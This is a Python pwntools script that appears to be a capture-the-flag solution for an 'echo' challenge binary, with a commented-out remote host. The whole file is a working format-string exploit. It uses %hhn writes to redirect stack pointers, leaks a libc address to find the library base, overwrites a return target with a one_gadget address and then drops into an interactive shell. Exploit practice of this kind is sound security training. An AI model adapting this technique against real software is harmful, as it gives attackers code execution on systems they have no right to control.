from pwn import *

for i in range(100):
    try:
        r = process("./echo-b2cd7ca07d84aa04c38bb181453f96eb")
        #r = remote("csie.ctf.tw", "10132")

        offset = 0xf0

        #r.send(("%7$p".ljust(0x2f, "_")+"."))
        #offset = int(r.recvuntil("_")[:-1], 16)
        #r.recvuntil(".")
        fd = "0000000000601010"
        r.send("%{}c%7$hhn".format(int(fd[-2:],16)).ljust(0x2f, "_")+".")
        #sleep(0.3)
        #r.recvuntil(".")

        # r.send("%7$p".ljust(0x2f, "_")+"*")
        # r.recvuntil("0x")
        # print(r.recvuntil("*"))
        
        for i in range(2,6,2):
            offset += 1
            r.send(("%" + str(offset & 0xff) + "c%5$hhn").ljust(0x2f, "_")+".")
            #sleep(0.3)
            #r.recvuntil(".")
            r.send("%{}c%7$hhn".format(int(fd[-i-2:-i],16)).ljust(0x2f, "_")+".")
            #sleep(0.3)
            #r.recvuntil(".")

        offset += 6
        r.send("%1c%9$hhn".ljust(0x2f, "_")+"*")
        r.recvuntil("*")
        #r.send("%9$p".ljust(0x2f, "_")+".")
        #print(r.recvuntil("."))
        r.send("%10$p".ljust(0x2f, "_")+".")
        start_main = r.recvuntil("_")[:-1]
        r.recvuntil(".")
        #print(start_main)
        libc = int(start_main, 16) - 0x20830
        #print(hex(libc))
        one_gadget = hex(libc + 0x45216)
        print("one_gadget: " + one_gadget)
        #r.recvuntil(".")

        r.send("%9$p".ljust(0x2f, "_")+"*")
        r.recvuntil("0x")
        print(r.recvuntil("*"))
        
        r.send(("%" + str(offset & 0xff) + "c%5$hhn").ljust(0x2f, "_")+".")
        r.send("%{}c%7$hhn".format(int(one_gadget[-2:],16)).ljust(0x2f, "_")+".") 
        
        for i in range(2,10,2):
            offset += 1
            r.send(("%" + str(offset & 0xff) + "c%5$hhn").ljust(0x2f, "_")+".")
            #sleep(0.3)
            #r.recvuntil(".")
            r.send("%{}c%7$hhn".format(int(one_gadget[-i-2:-i],16)).ljust(0x2f, "_")+".")
            #sleep(0.3)
            #r.recvuntil(".")
        
        # r.send("%10$p".ljust(0x2f, "_")+"*")
        # r.recvuntil("0x")
        # print(r.recvuntil("*"))
        
        r.send("exit")
        sleep(0.3)
        r.recvuntil(":")
        r.send("xx")
        sleep(0.3)
        r.interactive()
    except EOFError:
        continue
